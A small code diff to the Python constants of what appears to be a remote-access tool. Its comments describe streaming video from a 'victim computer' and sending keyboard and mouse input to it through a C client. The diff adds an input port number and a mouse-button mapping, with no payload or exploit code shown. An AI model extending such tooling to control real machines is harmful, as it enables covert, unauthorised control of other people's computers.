@@ -9,6 +9,8 @@ from pygame.locals import *
 SERVER_PORT = 8080
 # port number for receiving video stream from victim computer
 VIDEO_PORT = 8081
+# port number for sending input from pygame to victim computer
+INPUT_PORT = 8082
 
 # change directory and list directory contents
 CHANGE_DIR = 1
@@ -45,6 +47,12 @@ KEY_DOWN = 24 # this will be followed by the code of the key pressed (from KEY_D
 KEY_UP = 25 # same as KEY_DOWN
 START_INPUT = 26 # tell the C client to simulate inputs from a list of all input events since last frame
 CONT_INPUT = 27 # tell the C client there's more input - ends with null terminator
+
+MOUSE_DICT = { # dictionary to map pygame mouse numbers to MOUSE_LEFT, MOUSE_RIGHT, and MOUSE_MIDDLE
+	1: MOUSE_LEFT,
+	2: MOUSE_MIDDLE,
+	3: MOUSE_RIGHT
+}
 
 KEY_DICT = { # this is a dictionary to map pygame key constants to Windows virtual-key codes
 	K_BACKSPACE: 0x08, #   \b      backspace
